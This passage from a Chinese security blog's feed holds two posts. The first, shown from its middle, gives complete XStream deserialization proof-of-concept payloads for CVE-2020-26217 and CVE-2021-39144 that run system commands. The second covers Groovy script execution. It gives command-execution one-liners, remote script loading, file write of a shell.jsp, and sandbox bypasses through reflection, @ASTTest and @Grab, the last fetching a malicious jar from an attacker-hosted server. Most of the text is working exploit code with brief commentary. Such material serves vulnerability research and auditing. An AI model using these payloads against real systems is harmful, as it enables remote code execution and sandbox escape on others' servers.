class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="aMlfF">CVE-2020-26217</h3>
漏洞Poc如下，这里通过一个黑名单之外的gadget，可以成功绕过之前的补丁造成远程命令执行。包括1.4.13在内的所有版本都会受到漏洞的影响。

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WZtEe"><font style="color:rgb(51, 51, 51);">CVE-2021-39144</font></h3>
这条链是纯原生反序列化利用链

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&#x27;sun.tracing.NullProvider&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">active</span>&gt;</span>true<span class="tag">&lt;/<span class="name">active</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">providerType</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">providerType</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">probes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>compareTo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">proxy</span> <span class="attr">class</span>=<span class="string">&#x27;java.lang.Runtime&#x27;</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">implementing__method</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">name</span>&gt;</span>exec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.String<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">implementing__method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">probes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>XStream</tag>
      </tags>
  </entry>
  <entry>
    <title>Groovy脚本执行</title>
    <url>/2025/08/04/Groovy%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="eZT12">Groovy脚本执行</h1>
<h2 id="IQBDG">前言</h2>
在审计一套源码的时候，mt告诉我的漏洞中，有一个从来没见过没听过的漏洞 —— Groovy脚本执行，今天简单看一下吧

<p>导入依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="oHaDg">Groovy命令执行</h2>
Groovy 是一种基于 Java 平台的面向对象编程语言

<h3 id="HKPPP">直接执行</h3>
Groovy脚本允许在脚本中执行系统命令

<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>想要回显执行命令的结果，用<code>.text</code>来接受回显，<code>println</code>来输出回显</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="kdz8F">MethodClosure执行</h3>
MethodClosure允许将方法封装成闭包，便于执行

<p>有两种方式：</p>
<p>使用<code>Runtime.getRuntime.exec()</code></p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>直接执行字符串命令</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call();</span><br></pre></td></tr></table></figure>

<h2 id="ALPXO">Java中执行Groovy脚本</h2>
在Java中有多种方式可以执行Groovy脚本

<h3 id="Uh7Pf">GroovyShell</h3>
GroovyShell 类用于执行 Groovy 脚本，支持多种数据源

<h4 id="yK6vM">字符串执行</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>;</span><br><span class="line">System.out.println(groovyShell.evaluate(cmd));</span><br></pre></td></tr></table></figure>

<h4 id="yg1h1">文件执行</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/java/com/groovy/TestGroovyScript.groovy&quot;</span>);</span><br><span class="line">System.out.println(groovyShell.evaluate(file));</span><br></pre></td></tr></table></figure>

<h4 id="uR4rV">远程URL执行</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line"><span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://127.0.0.1:8888/exp.groovy&quot;</span>);</span><br><span class="line">System.out.println(groovyShell.evaluate(uri));</span><br></pre></td></tr></table></figure>

<h3 id="o2xDW">GroovyScripteEngine</h3>
GroovyScriptEngine 用于从指定源加载和执行 Groovy 脚本

<h4 id="YsSeR">本地文件加载脚本</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;src/main/java/com/groovy&quot;</span>);</span><br><span class="line">scriptEngine.run(<span class="string">&quot;TestGroovyScript.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="tIaRE">远程URL加载脚本</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">scriptEngine.run(<span class="string">&quot;exp.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="fOpXr">GroovyScriptEvaluator</h3>
使用 GroovyScriptEvaluator 执行 Groovy 代码，支持 StaticScriptSource 和 ResourceScriptSource

<h4 id="ZQfkG">使用StaticScriptEvaluator</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyScriptEvaluator</span> <span class="variable">groovyScriptEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEvaluator</span>();</span><br><span class="line"><span class="type">ScriptSource</span> <span class="variable">scriptSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StaticScriptSource</span>(<span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>);</span><br><span class="line">System.out.println(groovyScriptEvaluator.evaluate(scriptSource));</span><br></pre></td></tr></table></figure>

<h4 id="n2Fm4">使用ResourceScript</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Resource</span> <span class="variable">urlResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(<span class="string">&quot;http://127.0.0.1:8888/exp.groovy&quot;</span>);</span><br><span class="line"><span class="type">ScriptSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(urlResource);</span><br><span class="line">System.out.println(groovyScriptEvaluator.evaluate(source));</span><br></pre></td></tr></table></figure>

<h3 id="sYoCe">GroovyClassLoader</h3>
GroovyClassLoader 用于在 Java 中加载和调用 Groovy 类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GroovyClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.parseClass(<span class="string">&quot;class Test &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    static void main(String[] args) &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        GroovyShell groovyShell = new GroovyShell();\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        String cmd = \&quot;\\\&quot;whoami\\\&quot;.execute().text\&quot;;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        println(groovyShell.evaluate(cmd).toString());\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="type">GroovyObject</span> <span class="variable">object</span> <span class="operator">=</span> (GroovyObject) clazz.newInstance();</span><br><span class="line">object.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="RBnlK">ScriptEngine</h3>
使用 javax.script.ScriptEngine 执行 Groovy 脚本

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;groovy&quot;</span>);</span><br><span class="line">System.out.println(scriptEngine.eval(<span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="gLuK7">其他利用方式</h3>
<h4 id="zugFf">文件读取</h4>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">text=newFile(<span class="string">&quot;C:\\Windows\\system.ini&quot;</span>).eachLine&#123;printlnit;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AvpCE">文件写入</h4>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">newFile(<span class="string">&quot;C:\\Users\\RedTeam\\Desktop\\SecTest\\shell.jsp&quot;</span>).write(<span class="string">&#x27;HelloAl1ex&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="OF9jY">绕过沙箱</h2>
有些情况下，会使用groovy沙箱机制保护敏感脚本的执行，在一些情况下可以绕过

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.kohsuke<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-sandbox<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ZoTyg">Java反射Bypass</h3>
有些情况在沙箱中，通过匹配调用方法来进行拦截，那么通过反射调用，即可绕过拦截

<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常规反射调用</span></span><br><span class="line"><span class="string">&quot;xxx.forName(&quot;</span>java.lang.Runtime<span class="string">&quot;).getRuntime().exec(&quot;</span>id<span class="string">&quot;).getText()</span></span><br><span class="line"><span class="string">//拼接反射调用</span></span><br><span class="line"><span class="string">import java.lang.reflect.Method;</span></span><br><span class="line"><span class="string">Class&lt;?&gt;rt=Class.forName(&quot;</span>java.lan<span class="string">&quot;+&quot;</span>g.Run<span class="string">&quot;+&quot;</span>time<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Methodgr=rt.getMethod(&quot;</span>getRun<span class="string">&quot;+&quot;</span>time<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Methodex=rt.getMethod(&quot;</span>exe<span class="string">&quot;+&quot;</span>c<span class="string">&quot;,String.class);</span></span><br><span class="line"><span class="string">ex.invoke(gr.invoke(null),&quot;</span>cal<span class="string">&quot;+&quot;</span>c<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>

<h3 id="rznvT">@AST注解执行恶意类</h3>
利用AST注解能够执行断言从而实现代码执行，同时可以利用该方式Bypass沙箱

<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;@groovy.transform.ASTTest(value=&#123;assertRuntime.getRuntime().exec(&quot;calc&quot;)&#125;)defx&#x27;&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="PIjkd">@Grab注解加载远程恶意类</h3>
Groovy的Grape机制允许开发者在不修改ClassPath的情况下，动态地引入Jar依赖，那么我们也可以使用这个特性，动态引入恶意代码，从而导致RCE

<p>如果使用这种方式绕过沙箱，那么要求对方服务器存在<code>ivy</code>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ivy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ivy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们需要编写一个恶意的EXP类，执行我们的恶意代码，并打包为jar包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">javac Exp.java</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建服务提供者配置文件</span></span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line">echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包jar包</span></span><br><span class="line">jar cvf poc-0.jar Exp.class META-INF</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用将jar包上传到服务器，使用Python开启一个http服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>

<p>通过上面任意一种方式，执行以下groovy脚本</p>
<p>在执行该groovy脚本时，会从远程地址加载恶意jar包并加载，实例化我们的恶意类，从而执行系统命令RCE</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name=&#x27;Exp&#x27;, root=&#x27;http://127.0.0.1:8000/&#x27;)</span></span><br><span class="line"><span class="string">    @Grab(group=&#x27;test&#x27;, module=&#x27;poc&#x27;, version=&#x27;0&#x27;)</span></span><br><span class="line"><span class="string">    import Exp;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>脚本执行</tag>
      </tags>
  </entry>
  <entry>
    <title>H2-JDBC-Attack</title>
